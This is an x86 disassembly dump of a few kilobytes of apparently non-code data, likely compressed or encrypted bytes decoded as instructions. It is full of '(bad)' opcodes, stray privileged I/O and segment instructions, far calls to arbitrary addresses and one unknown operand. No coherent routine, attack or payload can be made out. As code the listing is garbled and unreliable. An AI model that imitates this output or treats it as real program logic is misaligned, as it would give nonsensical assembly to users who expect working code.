  419dfe:	es pop ebp
  419e00:	lods   al,BYTE PTR ds:[esi]
  419e01:	mov    edi,0x91d3c49c
  419e06:	sub    DWORD PTR [edx-0x14],0xffffffee
  419e0a:	xor    DWORD PTR [ecx],edx
  419e0c:	mov    cs,WORD PTR [ecx+0x54e86a32]
  419e12:	cmp    BYTE PTR ds:0xc26f73c3,ah
  419e18:	pop    ds
  419e19:	adc    al,BYTE PTR [ebx-0x2d]
  419e1c:	mov    bh,0x8b
  419e1e:	les    eax,FWORD PTR [edx*4+0x7e99a623]
  419e25:	pop    es
  419e26:	mov    dh,BYTE PTR [edi+0x6b]
  419e29:	xor    bh,BYTE PTR [esi]
  419e2b:	pop    ebp
  419e2c:	sbb    bh,dl
  419e2e:	mov    ds:0xad85b777,eax
  419e33:	es and al,0x44
  419e36:	nop
  419e37:	test   BYTE PTR [ebx],cl
  419e39:	pusha  
  419e3a:	and    eax,0x24add18e
  419e3f:	pop    ebx
  419e40:	imul   esi,DWORD PTR [ebp-0x35971225],0xe11cced0
  419e4a:	(bad)  
  419e4b:	lods   al,BYTE PTR ds:[esi]
  419e4c:	adc    BYTE PTR [edi],0xb0
  419e4f:	loope  0x419e46
  419e51:	(bad)  
  419e53:	into   
  419e54:	repz jle 0x419e41
  419e57:	daa    
  419e58:	mov    DWORD PTR [eax-0x63fe693a],ebx
  419e5e:	js     0x419e02
  419e60:	add    BYTE PTR [edx+0x2],al
  419e63:	jne    0x419e0c
  419e65:	mov    dh,0xb9
  419e67:	sbb    bh,ch
  419e69:	and    eax,0x3857d06d
  419e6e:	sahf   
  419e6f:	loopne 0x419e1c
  419e71:	cs push esi
  419e73:	ficom  WORD PTR [eax-0x5e4e99a5]
  419e79:	jl     0x419e0f
  419e7b:	or     al,0xf8
  419e7d:	call   0x406c9a13
  419e82:	push   ss
  419e83:	jge    0x419e1d
  419e85:	lock add edx,DWORD PTR [esi+0x6ed26881]
  419e8c:	mov    al,ds:0xc13b5734
  419e91:	sub    eax,0xc5aba745
  419e96:	rcl    DWORD PTR [esi],cl
  419e98:	fldenvw [ecx-0x33967a32]
  419e9f:	jnp    0x419e7c
  419ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea2:	enter  0xa2c0,0x56
  419ea6:	lods   al,BYTE PTR ds:[esi]
  419ea7:	out    dx,eax
  419ea8:	je     0x419e2c
  419eaa:	outs   dx,DWORD PTR cs:[esi]
  419eac:	stc    
  419ead:	mul    DWORD PTR [ecx]
  419eaf:	(bad)  
  419eb0:	iret   
  419eb1:	xchg   DWORD PTR [ebp+0x13],ebp
  419eb4:	push   es
  419eb5:	jge    0x419e4a
  419eb7:	nop
  419eb8:	sub    BYTE PTR [edx],ch
  419eba:	cmp    BYTE PTR [edx-0x5342d590],bl
  419ec0:	rol    BYTE PTR [edi-0x3f8cc372],1
  419ec6:	iret   
  419ec7:	mov    ebx,0xb8c51d14
  419ecc:	mov    cl,0xce
  419ece:	(bad)  
  419ecf:	popa   
  419ed0:	fdivr  st(6),st
  419ed2:	sub    eax,0x6c0bf526
  419ed7:	and    eax,0x673b0358
  419edc:	adc    eax,0x86638f70
  419ee1:	and    eax,0xe3ce08ad
  419ee6:	jp     0x419e78
  419ee8:	test   DWORD PTR [ebx+esi*8],esp
  419eeb:	pusha  
  419eec:	shl    DWORD PTR [edi-0x15e5ccf0],1
  419ef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ef3:	sub    al,BYTE PTR [ecx]
  419ef5:	rcr    BYTE PTR [ecx+0x3459cf93],cl
  419efb:	shr    BYTE PTR [edi],0x77
  419efe:	arpl   WORD PTR [ebp+ebp*2+0x1e3d8b0d],si
  419f05:	test   cl,ah
  419f07:	jmp    0x2a65aa72
  419f0c:	dec    edi
  419f0d:	jge    0x419f55
  419f0f:	jb     0x419ef4
  419f11:	or     ah,BYTE PTR [esi-0x3f06425d]
  419f17:	test   BYTE PTR [eax+0x1f14fbb3],al
  419f1d:	leave  
  419f1e:	(bad)  
  419f20:	xor    al,0x91
  419f22:	neg    DWORD PTR [esi-0x30]
  419f25:	repnz xor eax,0xf0d76f42
  419f2b:	jno    0x419ed6
  419f2d:	xor    cl,dl
  419f2f:	push   eax
  419f30:	lds    edx,FWORD PTR [ecx-0x2a]
  419f33:	pop    edx
  419f34:	and    al,0x52
  419f36:	call   0xad98:0x73e4032f
  419f3d:	lds    esi,FWORD PTR [eax-0x21]
  419f40:	and    DWORD PTR [edx+0x1],edx
  419f43:	in     al,dx
  419f44:	cli    
  419f45:	pop    ebp
  419f46:	jnp    0x419faf
  419f48:	xchg   ecx,eax
  419f49:	jg     0x419f26
  419f4b:	nop
  419f4c:	xchg   edx,eax
  419f4d:	bound  ecx,QWORD PTR [edi+0x70]
  419f50:	repnz push esi
  419f52:	inc    al
  419f54:	out    dx,al
  419f55:	push   eax
  419f56:	in     eax,0xfa
  419f58:	cmp    ebx,DWORD PTR [ebx]
  419f5a:	dec    ebp
  419f5b:	mov    ah,BYTE PTR [edx*1-0x6ec9459e]
  419f62:	retf   0xb85c
  419f65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f66:	mov    dl,0xd
  419f68:	cdq    
  419f69:	pusha  
  419f6a:	popfw  
  419f6c:	leave  
  419f6d:	out    dx,eax
  419f6e:	sub    eax,0x9a006e28
  419f73:	lock inc eax
  419f75:	mov    ds:0xad9a6dd7,al
  419f7a:	pop    edx
  419f7b:	push   edx
  419f7c:	add    ebp,0xb6afd97c
  419f82:	push   0x65c59029
  419f87:	rol    BYTE PTR [eax+0x8],0xbb
  419f8b:	ss inc ebp
  419f8d:	mov    DWORD PTR [ecx],esp
  419f8f:	bound  esi,QWORD PTR [eax+0x18]
  419f92:	ss cmp al,0x14
  419f95:	hlt    
  419f96:	ret    
  419f97:	jl     0x419f67
  419f99:	out    dx,eax
  419f9a:	repz in eax,dx
  419f9c:	mov    al,0x13
  419f9e:	cmp    eax,DWORD PTR [bp+di+0x69]
  419fa2:	out    0xc5,al
  419fa4:	mov    BYTE PTR [ecx-0x251408b0],dh
  419faa:	test   al,0x9e
  419fac:	mov    esp,0xfc198a3c
  419fb1:	inc    edx
  419fb2:	data16 aaa 
  419fb4:	and    BYTE PTR [edx+edi*8+0x67],ch
  419fb8:	or     BYTE PTR [ebx+0x6d],dl
  419fbb:	call   0xd6fc:0xd43bde58
  419fc2:	push   eax
  419fc3:	iret   
  419fc4:	aam    0x26
  419fc6:	test   esp,0x9adaba3e
  419fcc:	inc    edx
  419fcd:	sbb    BYTE PTR [eax+0xb291843],dl
  419fd3:	and    eax,0x71770d96
  419fd8:	mov    al,0x91
  419fda:	pop    es
  419fdb:	add    dh,BYTE PTR [ebx]
  419fdd:	call   0x15a0:0x3e2ac79
  419fe4:	sub    eax,0x129542c2
  419fe9:	and    DWORD PTR ds:0xad9cedea,edi
  419fef:	sub    BYTE PTR [edi+ebp*1+0x6a583552],cl
  419ff6:	xchg   dl,cl
  419ff8:	sar    ebx,1
  419ffa:	out    0x3,al
  419ffc:	daa    
  419ffd:	xor    esi,DWORD PTR [esi]
  419fff:	jnp    0x419fb2
  41a001:	or     al,0xa9
  41a003:	test   al,0x95
  41a005:	add    al,0x54
  41a007:	mov    ds:0x52b6a9a,al
  41a00c:	sbb    eax,0xbed51362
  41a011:	aam    0x7b
  41a013:	scas   al,BYTE PTR es:[edi]
  41a014:	jecxz  0x41a076
  41a016:	jecxz  0x419fda
  41a018:	mov    al,ds:0x6d84b5ca
  41a01d:	add    eax,edi
  41a01f:	ret    
  41a020:	and    al,0xca
  41a022:	cmc    
  41a023:	xor    bl,BYTE PTR [ebx]
  41a025:	add    dl,cl
  41a027:	jecxz  0x41a015
  41a029:	mov    DWORD PTR [edi+0x3e],esp
  41a02c:	popf   
  41a02d:	lods   al,BYTE PTR ds:[esi]
  41a02e:	fwait
  41a02f:	test   DWORD PTR [edx-0x51],0x573b1205
  41a036:	ins    DWORD PTR es:[edi],dx
  41a037:	sbb    BYTE PTR [esi+0x58],dh
  41a03a:	or     bl,dh
  41a03c:	inc    ebx
  41a03d:	xchg   esi,eax
  41a03e:	(bad)  
  41a03f:	fild   DWORD PTR [ecx-0x2a]
  41a042:	fldenv ds:0xf73250a3
  41a048:	scas   al,BYTE PTR es:[edi]
  41a049:	out    dx,eax
  41a04a:	sti    
  41a04b:	loopne 0x41a0a3
  41a04d:	fbld   TBYTE PTR [ecx-0x7a]
  41a050:	ins    DWORD PTR es:[edi],dx
  41a051:	rcr    DWORD PTR [esi-0x5511374b],0xc2
  41a058:	and    edi,eax
  41a05a:	out    0x7b,al
  41a05c:	jno    0x41a09b
  41a05e:	adc    eax,0x578baf3e
  41a063:	(bad)  
  41a064:	lahf   
  41a065:	mov    edx,0xd20a8001
  41a06a:	es loop 0x41a0bc
  41a06d:	xchg   ebx,eax
  41a06e:	shl    bl,0xc1
  41a071:	mov    ecx,0xabeafe21
  41a076:	push   0x22
  41a078:	cmc    
  41a079:	push   0xa5421ea4
  41a07e:	out    0x8f,al
  41a080:	mov    ebp,0xe209700c
  41a085:	sbb    eax,0xe77ea93c
  41a08a:	cwde   
  41a08b:	jne    0x41a0e3
  41a08d:	mov    ds:0x661f0ca3,al
  41a092:	adc    al,0x6f
  41a094:	sar    esi,cl
  41a096:	bound  esi,QWORD PTR [ebp-0x6c]
  41a099:	jb     0x41a0dd
  41a09b:	adc    ebx,DWORD PTR [esi-0x5573af62]
  41a0a1:	arpl   WORD PTR [eax],ax
  41a0a3:	adc    eax,0x637ee2c7
  41a0a8:	sub    eax,edx
  41a0aa:	enter  0x6d13,0x45
  41a0ae:	fisttp WORD PTR [ebx+0x10c4e968]
  41a0b4:	mov    bl,0x3d
  41a0b6:	ins    DWORD PTR es:[edi],dx
  41a0b7:	mov    ds:0x6248be56,eax
  41a0bc:	or     bh,bl
  41a0be:	inc    ecx
  41a0bf:	je     0x41a084
  41a0c1:	lea    edi,[ecx]
  41a0c3:	mov    ch,0x67
  41a0c5:	in     al,dx
  41a0c6:	mov    bl,0x3b
  41a0c8:	jb     0x41a0ce
  41a0ca:	jge    0x41a12a
  41a0cc:	or     eax,0x83d60b6
  41a0d1:	mov    eax,ds:0xe8cabd5e
  41a0d6:	xor    eax,0x3f5e1ac6
  41a0db:	rep lods al,BYTE PTR ds:[esi]
  41a0dd:	sbb    edx,esi
  41a0df:	fs pop eax
  41a0e1:	mov    al,ds:0xdf30ef8b
  41a0e6:	inc    esp
  41a0e7:	mov    ds:0xd47f70ef,al
  41a0ec:	mov    bl,BYTE PTR [ebp+0x95e4b91]
  41a0f2:	adc    edx,eax
  41a0f4:	jae    0x41a0f0
  41a0f6:	jnp    0x41a0eb
  41a0f8:	scas   eax,DWORD PTR es:[edi]
  41a0f9:	test   al,0x3a
  41a0fb:	mov    eax,ds:0x6e374c88
  41a100:	int3   
  41a101:	shl    BYTE PTR [ecx+0x48],1
  41a104:	jle    0x41a176
  41a106:	adc    al,0xc9
  41a108:	adc    BYTE PTR [esi+0xa],dl
  41a10b:	scas   eax,DWORD PTR es:[edi]
  41a10c:	xlat   BYTE PTR ds:[ebx]
  41a10d:	cmp    esp,DWORD PTR [edi+0x5b]
  41a110:	div    BYTE PTR [eax]
  41a112:	pop    es
  41a113:	xor    al,0x55
  41a115:	nop
  41a116:	cmp    esi,DWORD PTR [edx+0x624c7f6f]
  41a11c:	adc    eax,0x7f574efc
  41a121:	push   esi
  41a122:	xor    al,0x3c
  41a124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a125:	dec    edx
  41a126:	xchg   ebx,eax
  41a127:	mov    al,ds:0xfdab0fbb
  41a12c:	icebp  
  41a12d:	xor    ebx,edx
  41a12f:	mov    ecx,0xb568561c
  41a134:	les    edi,FWORD PTR [edx+ebp*2]
  41a137:	adc    dl,BYTE PTR [esp+ebx*4+0x8b8de74]
  41a13e:	and    DWORD PTR [ebx+0x2174f4d8],esi
  41a144:	jmp    0x41a157
  41a146:	cld    
  41a147:	or     DWORD PTR [ebx],esp
  41a149:	in     al,dx
  41a14a:	loope  0x41a178
  41a14c:	(bad)  
  41a14d:	ss pop esp
  41a14f:	sbb    BYTE PTR [esp+edi*2],dl
  41a152:	dec    edi
  41a153:	pop    ds
  41a154:	adc    BYTE PTR [edx],0x87
  41a157:	data16 jge 0x41a18e
  41a15a:	inc    ecx
  41a15b:	jmp    0x41a1d8
  41a15d:	add    ah,dl
  41a15f:	and    al,0x94
  41a161:	mov    DWORD PTR [esi-0x6ac10dfa],edi
  41a167:	hlt    
  41a168:	sbb    al,0x93
  41a16a:	pop    eax
  41a16b:	call   DWORD PTR [ebx+0x12de8e31]
  41a171:	stc    
  41a172:	sbb    DWORD PTR [ebx+0x6],0x250d80ed
  41a179:	sub    esp,ebx
  41a17b:	pop    esi
  41a17c:	scas   eax,DWORD PTR es:[edi]
  41a17d:	cmp    DWORD PTR [ebx-0x7a1506ef],ebx
  41a183:	ja     0x41a125
  41a185:	mov    bl,0xb1
  41a187:	dec    esp
  41a188:	adc    cl,BYTE PTR [ebx]
  41a18a:	xchg   DWORD PTR [edi],eax
  41a18c:	add    DWORD PTR [edx],esp
  41a18e:	xlat   BYTE PTR ds:[ebx]
  41a18f:	leave  
  41a190:	sbb    al,0x97
  41a192:	xlat   BYTE PTR ds:[ebx]
  41a193:	retf   
  41a194:	pushf  
  41a195:	ds push ecx
  41a197:	enter  0x8e59,0x1b
  41a19b:	ds mov dl,0x1b
  41a19e:	xor    BYTE PTR [eax+0xe],ch
  41a1a1:	das    
  41a1a2:	fwait
  41a1a3:	push   edx
  41a1a4:	xchg   ebx,eax
  41a1a5:	not    BYTE PTR [edi]
  41a1a7:	adc    ah,cl
  41a1a9:	ret    0x379f
  41a1ac:	enter  0xf4f9,0xd5
  41a1b0:	int3   
  41a1b1:	lahf   
  41a1b2:	jmp    0xd6a9766
  41a1b7:	stos   DWORD PTR es:[edi],eax
  41a1b8:	das    
  41a1b9:	and    eax,0x402b4419
  41a1be:	add    DWORD PTR [eax],0x4
  41a1c1:	dec    edi
  41a1c2:	cld    
  41a1c3:	xchg   ebx,eax
  41a1c4:	xchg   BYTE PTR [ebp+0x59],bl
  41a1c7:	mov    esi,gs
  41a1c9:	jae    0x41a20a
  41a1cb:	push   cs
  41a1cc:	or     dl,BYTE PTR [eax+0x646fd504]
  41a1d2:	dec    ebp
  41a1d3:	nop
  41a1d4:	icebp  
  41a1d5:	in     eax,0x39
  41a1d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1d8:	test   ebx,edx
  41a1da:	pop    ebx
  41a1db:	jecxz  0x41a1a0
  41a1dd:	xchg   ebx,eax
  41a1de:	imul   edx,DWORD PTR [ecx],0x9f20fd90
  41a1e4:	pop    esp
  41a1e5:	mov    esp,0x5e0b6dc
  41a1ea:	and    edi,DWORD PTR [edi+0x4c5ad760]
  41a1f0:	inc    esp
  41a1f1:	int    0xae
  41a1f3:	stos   BYTE PTR es:[edi],al
  41a1f4:	loopne 0x41a213
  41a1f6:	mov    edi,DWORD PTR [ebx-0x14]
  41a1f9:	inc    eax
  41a1fa:	dec    edi
  41a1fb:	(bad)  
  41a1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1fd:	adc    DWORD PTR [edi+eax*4],0xffffffed
  41a201:	mov    ch,0xe5
  41a203:	dec    edi
  41a204:	retf   
  41a205:	test   eax,0x2149f86e
  41a20a:	jae    0x41a194
  41a20c:	mov    edi,fs
  41a20e:	in     ax,dx
  41a210:	xchg   esi,eax
  41a211:	out    0xd,eax
  41a213:	(bad)  
  41a214:	jmp    0x41a223
  41a216:	mov    fs,ebp
  41a218:	fbstp  TBYTE PTR [ecx+0x6]
  41a21b:	lods   al,BYTE PTR ds:[esi]
  41a21c:	add    edx,DWORD PTR [bx+di]
  41a21f:	mov    DWORD PTR [ebx+0x11],0x65dbca66
  41a226:	add    bl,BYTE PTR [edi]
  41a228:	mov    al,0xe1
  41a22a:	cli    
  41a22b:	pusha  
  41a22c:	xchg   ebp,eax
  41a22d:	mov    bh,0xc0
  41a22f:	fisub  DWORD PTR [edi+0x3e980b1b]
  41a235:	sbb    DWORD PTR [edx],edi
  41a237:	fistp  DWORD PTR [esi]
  41a239:	cmp    BYTE PTR [ecx+0x4cfb5aff],bl
  41a23f:	int3   
  41a240:	xor    DWORD PTR [ecx+0x4e9704b5],esp
  41a246:	xchg   edx,eax
  41a247:	mov    BYTE PTR [eax],al
	...
  41a415:	add    BYTE PTR [eax],al
  41a417:	add    BYTE PTR [edi+0x5d7b4dd7],al
  41a41d:	sti    
  41a41e:	mov    bh,0xff
  41a420:	ds aad 0x54
  41a423:	ret    0x41e8
  41a426:	pop    edi
  41a427:	xchg   esi,eax
  41a428:	jl     0x41a3c5
  41a42a:	add    DWORD PTR [eax],eax
  41a42c:	and    eax,0x22000007
  41a431:	(bad)  
  41a432:	mov    esp,0xfd3e3ff1
  41a437:	fimul  WORD PTR [esi+ebp*8+0x25]
  41a43b:	dec    esi
  41a43c:	add    dh,BYTE PTR [ebp+0x39]
  41a43f:	xor    esi,DWORD PTR [ebx+0x3]
  41a442:	popa   
  41a443:	mov    eax,ds:0x1ed97614
  41a448:	pop    ebx
  41a449:	mov    ch,0x67
  41a44b:	mov    edi,DWORD PTR ss:[edx+0x44cbc792]
  41a452:	arpl   WORD PTR [ebx+0x1e05116e],di
  41a458:	lods   al,BYTE PTR ds:[esi]
  41a459:	and    cl,cl
  41a45b:	push   ebp
  41a45c:	(bad)  
  41a45d:	rcr    BYTE PTR [edx],0xbe
  41a460:	xchg   ebx,eax
  41a461:	push   ebp
  41a462:	lods   al,BYTE PTR ds:[esi]
  41a463:	cmp    al,BYTE PTR [edx]
  41a465:	hlt    
  41a466:	daa    
  41a467:	mov    eax,ds:0xbdbe25fe
  41a46c:	repz adc bl,BYTE PTR ss:[ebp-0x539373f4]
  41a474:	ficom  WORD PTR [esi+0x6f]
  41a477:	push   es
  41a478:	shl    esi,1
  41a47a:	fldlg2 
  41a47c:	sub    DWORD PTR [edx-0xdcb8c],0xa7862f91
  41a486:	lea    ebx,[ebx-0x1b]
  41a489:	jge    0x41a45d
  41a48b:	mov    esp,0x92572dee
  41a490:	in     eax,dx
  41a491:	jp     0x41a4dc
  41a493:	adc    esp,DWORD PTR [eax-0x79]
  41a496:	cdq    
  41a497:	retf   0x876b
  41a49a:	pop    esp
  41a49b:	and    eax,0x698ce024
  41a4a0:	cld    
  41a4a1:	xchg   DWORD PTR [esi],edx
  41a4a3:	adc    ecx,DWORD PTR [eax]
  41a4a5:	daa    
  41a4a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4a7:	outs   dx,DWORD PTR ds:[esi]
  41a4a8:	adc    esp,DWORD PTR [esi+edx*4-0x7]
  41a4ac:	cmp    BYTE PTR [esi-0x80],dl
  41a4af:	xchg   edx,eax
  41a4b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4b1:	adc    al,0xe1
  41a4b3:	sbb    al,0x5f
  41a4b5:	pop    edi
  41a4b6:	iret   
  41a4b7:	leave  
  41a4b8:	gs mov esi,0xa5d1f626
  41a4be:	arpl   WORD PTR [edi+0x1af1c777],di
  41a4c4:	in     eax,0x51
  41a4c6:	dec    esi
  41a4c7:	cmp    DWORD PTR [eax-0x4f],ecx
  41a4ca:	mov    WORD PTR [ecx+0x2d7a32f1],fs
  41a4d0:	call   FWORD PTR [edx+0x7a]
  41a4d3:	outs   dx,DWORD PTR ds:[esi]
  41a4d4:	pop    edx
  41a4d5:	outs   dx,BYTE PTR ds:[esi]
  41a4d6:	shl    ebp,0xe5
  41a4d9:	xchg   ebp,eax
  41a4da:	and    eax,0x3c73e1a3
  41a4df:	jp     0xc8286be3
  41a4e5:	sbb    al,0xef
  41a4e7:	inc    esi
  41a4e8:	add    dl,dh
  41a4ea:	loopne 0x41a549
  41a4ec:	cmp    eax,0x5ee04e4f
  41a4f1:	les    edi,FWORD PTR [eax]
  41a4f3:	mov    bl,0x2c
  41a4f5:	pop    ecx
  41a4f6:	push   esi
  41a4f7:	jnp    0x41a562
  41a4f9:	cmp    esp,DWORD PTR [ebx]
  41a4fb:	dec    esi
  41a4fc:	cmp    ebx,DWORD PTR [ecx+0x3f]
  41a4ff:	ins    BYTE PTR es:[edi],dx
  41a500:	sbb    DWORD PTR [ebx+ebp*4],ebp
  41a503:	mov    ?,WORD PTR [ecx+edx*2-0x33af8b83]
  41a50a:	jge    0x41a536
  41a50c:	ret    0x85f1
  41a50f:	adc    esp,DWORD PTR [ecx+0x73]
  41a512:	dec    BYTE PTR [edx]
  41a514:	xor    DWORD PTR [ebx-0x5f],esi
  41a517:	or     al,0x1a
  41a519:	loopne 0x41a545
  41a51b:	loopne 0x41a508
  41a51d:	push   ebp
  41a51e:	dec    edi
  41a51f:	xchg   ecx,eax
  41a520:	jno    0x41a569
  41a522:	xchg   edx,eax
  41a523:	mov    bh,0x15
  41a525:	mov    ah,0x53
  41a527:	adc    eax,0x793181f6
  41a52c:	mov    BYTE PTR [ebx+0x5d],bh
  41a52f:	stos   BYTE PTR es:[edi],al
  41a530:	hlt    
  41a531:	sub    DWORD PTR [ecx],ebp
  41a533:	outs   dx,BYTE PTR ds:[esi]
  41a534:	fild   WORD PTR [edi+edi*4+0x2c]
  41a538:	xchg   ebx,eax
  41a539:	sbb    eax,0x2c132f92
  41a53e:	adc    eax,DWORD PTR ds:0x8f534046
  41a544:	pop    esp
  41a545:	jge    0x41a53c
  41a547:	fstp   TBYTE PTR [edx]
  41a549:	imul   DWORD PTR ds:0x489e9bbd
  41a54f:	icebp  
  41a550:	pop    ds
  41a551:	push   0xffffffdb
  41a553:	(bad)  
  41a555:	nop
  41a556:	sub    dh,bh
  41a558:	pop    ss
  41a559:	(bad)  
  41a55b:	push   esi
  41a55c:	add    BYTE PTR [ecx+0x59],0x2f
  41a560:	sar    DWORD PTR [ebx+0x6e],1
  41a563:	es in  al,0x5a
  41a566:	loop   0x41a5da
  41a568:	sbb    BYTE PTR [bx+di-0x7918],ch
  41a56d:	xchg   DWORD PTR [ebx+edi*2+0x4608ae1f],edi
  41a574:	mov    bl,0xda
  41a576:	inc    esp
  41a577:	push   ebp
  41a578:	scas   eax,DWORD PTR es:[edi]
  41a579:	out    0xfb,al
  41a57b:	mov    ch,0xf1
  41a57d:	retf   0xf0d9
  41a580:	jne    0x41a5a8
  41a582:	scas   eax,DWORD PTR es:[edi]
  41a583:	gs mov al,0xc1
  41a586:	adc    dl,BYTE PTR [ebx+edx*8]
  41a589:	call   0xe0043b8a
  41a58e:	dec    ebp
  41a58f:	call   0xc853:0x31b49f49
  41a596:	loope  0x41a601
  41a598:	push   esp
  41a599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a59a:	cmp    al,BYTE PTR [eax]
  41a59c:	inc    esp
  41a59d:	call   0xd48c:0xfb19e498
  41a5a4:	xor    edi,DWORD PTR [edx-0x6f]
  41a5a7:	jl     0x41a569
  41a5a9:	and    esi,eax
  41a5ab:	push   cs
  41a5ac:	push   edx
  41a5ad:	xor    DWORD PTR [ecx],edx
  41a5af:	popa   
  41a5b0:	enter  0x4cda,0xb2
  41a5b4:	loope  0x41a5ce
  41a5b6:	loopne 0x41a5b2
  41a5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5b9:	int    0x2
  41a5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5bc:	das    
  41a5bd:	xchg   edx,eax
  41a5be:	jp     0x41a561
  41a5c0:	ds sbb edi,0xa32b5e98
  41a5c7:	pop    edi
  41a5c8:	xchg   edi,eax
  41a5c9:	es jns 0x41a5a9
  41a5cc:	cmc    
  41a5cd:	xchg   ebx,eax
  41a5ce:	out    dx,al
  41a5cf:	push   eax
  41a5d0:	mov    bh,0x2c
  41a5d2:	mov    dl,0xa0
  41a5d4:	rcl    eax,1
  41a5d6:	shl    BYTE PTR [ebx-0x25842cd4],0x78
  41a5dd:	arpl   WORD PTR [edx],si
  41a5df:	sub    BYTE PTR [edi+0x4720b9bb],dl
  41a5e5:	stos   DWORD PTR es:[edi],eax
  41a5e6:	cli    
  41a5e7:	rcl    ebx,cl
  41a5e9:	xchg   edx,eax
  41a5ea:	mov    ecx,0xac4a26f8
  41a5ef:	fwait
  41a5f0:	xor    al,0x6b
  41a5f2:	jecxz  0x41a5ff
  41a5f4:	jo     0x41a5aa
  41a5f6:	pop    DWORD PTR [edi-0x25]
  41a5f9:	popf   
  41a5fa:	mov    eax,ds:0x4025a36
  41a5ff:	inc    edx
  41a600:	sahf   
  41a601:	mov    ch,0x19
  41a603:	aad    0x4b
  41a605:	push   edi
  41a606:	(bad)  
  41a607:	xchg   ebp,eax
  41a608:	(bad)  
  41a609:	fnstsw WORD PTR [ecx]
  41a60b:	ds add cl,dh
  41a60e:	scas   al,BYTE PTR es:[edi]
  41a60f:	std    
  41a610:	or     cl,BYTE PTR [ebx+0x2a6e1c85]
  41a616:	pop    edx
  41a618:	push   edx
  41a619:	mov    ch,0xc6
  41a61b:	into   
  41a61c:	add    bl,ch
  41a61e:	lahf   
  41a61f:	jae    0x41a665
  41a621:	ja     0x41a5c6
  41a623:	(bad)  
  41a624:	out    dx,eax
  41a625:	jbe    0x41a5ff
  41a627:	pushf  
  41a628:	cmp    BYTE PTR [ecx+0x55],0x7f
  41a62c:	mov    edx,0x4101080b
  41a631:	mov    ecx,0x77d9a459
  41a636:	iret   
  41a637:	pop    edx
  41a638:	test   DWORD PTR [eax+0x21],esi
  41a63b:	and    eax,0x3f02bbea
  41a640:	xchg   esi,eax
  41a641:	push   cs
  41a642:	repnz test al,0x1b
  41a645:	lahf   
  41a646:	and    bl,BYTE PTR [ebp+0x5c]
  41a649:	scas   eax,DWORD PTR es:[edi]
  41a64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a64b:	adc    bl,cl
  41a64d:	mov    eax,ds:0xcb6ad6b3
  41a652:	or     BYTE PTR [edi],al
  41a654:	mov    ch,0xfb
  41a656:	loopne 0x41a621
  41a658:	mov    eax,0x449860c4
  41a65d:	pusha  
  41a65e:	sub    edi,esp
  41a660:	into   
  41a661:	mov    cl,0x73
  41a663:	dec    ebp
  41a664:	adc    DWORD PTR [edi-0x6b759873],ebp
  41a66a:	imul   ebp,DWORD PTR [eax+0x10cb0efc],0xffffffd0
  41a671:	ja     0x41a6db
  41a673:	jae    0x41a6e6
  41a675:	jmp    0xa749:0x77a4e77f
  41a67c:	push   esp
  41a67d:	sbb    DWORD PTR ds:0x7bd9ed15,esp
  41a683:	popf   
  41a684:	mov    ebx,0xaf2aa52
  41a689:	sub    esp,DWORD PTR [esi-0x4bf32e50]
  41a68f:	int3   
  41a690:	pop    es
  41a691:	icebp  
  41a692:	enter  0x3207,0xf0
  41a696:	mov    esi,0xa12f9839
  41a69b:	dec    ecx
  41a69c:	mov    ah,0xb4
  41a69e:	cmp    eax,0x50af8804
  41a6a3:	test   al,0xd9
  41a6a5:	adc    eax,ecx
  41a6a7:	inc    esi
  41a6a8:	inc    ecx
  41a6a9:	loopne 0x41a6e3
  41a6ab:	push   es
  41a6ac:	sub    eax,0x99f54070
  41a6b1:	dec    esp
  41a6b2:	ds inc ebx
  41a6b4:	nop
  41a6b5:	out    0x87,eax
  41a6b7:	(bad)  
  41a6b8:	push   ebp
  41a6b9:	inc    edi
  41a6ba:	nop
  41a6bb:	cli    
  41a6bc:	sub    dl,BYTE PTR ds:0xab76283e
  41a6c2:	push   ebp
  41a6c3:	jb     0x41a6fc
  41a6c5:	jne    0x41a66e
  41a6c7:	mov    esp,0x5a1f6920
  41a6cc:	jge    0x41a661
  41a6ce:	adc    eax,0xfdad3197
  41a6d3:	imul   edi,DWORD PTR [edx-0x19300c80],0xb77b3400
  41a6dd:	sub    esp,DWORD PTR [eax-0x354e9a42]
  41a6e3:	add    eax,DWORD PTR [esi-0x19]
  41a6e6:	lea    edx,[esi-0x5e16a399]
  41a6ec:	fstp   TBYTE PTR [edi-0x26]
  41a6ef:	iret   
  41a6f0:	stos   DWORD PTR es:[edi],eax
  41a6f1:	inc    ecx
  41a6f2:	mov    ch,0xff
  41a6f4:	add    ah,bl
  41a6f6:	(bad)  
  41a6f7:	xor    DWORD PTR [ebx+eax*4],ebx
  41a6fa:	push   cs
  41a6fb:	fdiv   st,st(1)
  41a6fd:	clc    
  41a6fe:	int    0x50
  41a700:	js     0x41a758
  41a702:	aam    0xdc
  41a704:	sbb    BYTE PTR [ebp+edi*4+0x5e],ch
  41a708:	or     ch,BYTE PTR ss:[esi]
  41a70b:	out    dx,eax
  41a70c:	mov    ah,0xc8
  41a70e:	mul    BYTE PTR [eax+ebp*8]
  41a711:	out    0x5,eax
  41a713:	lock pop ds
  41a715:	cmc    
  41a716:	mov    esi,0x66abfbaa
  41a71b:	mov    dl,0x34
  41a71d:	ins    DWORD PTR es:[edi],dx
  41a71e:	or     DWORD PTR [edi-0x7],ebp
  41a721:	cld    
  41a722:	pop    es
  41a723:	leave  
  41a724:	xor    ebx,esi
  41a726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a727:	scas   eax,DWORD PTR es:[edi]
  41a728:	add    cl,bh
  41a72a:	fcmovnb st,st(2)
  41a72c:	jge    0x41a740
  41a72e:	int3   
  41a72f:	mov    esi,0xb018bad
  41a734:	dec    ebx
  41a735:	hlt    
  41a736:	outs   dx,BYTE PTR ds:[esi]
  41a737:	mov    esp,0xff92d80e
  41a73c:	fstp   TBYTE PTR [eax-0x75f536f0]
  41a742:	jl     0x41a6d3
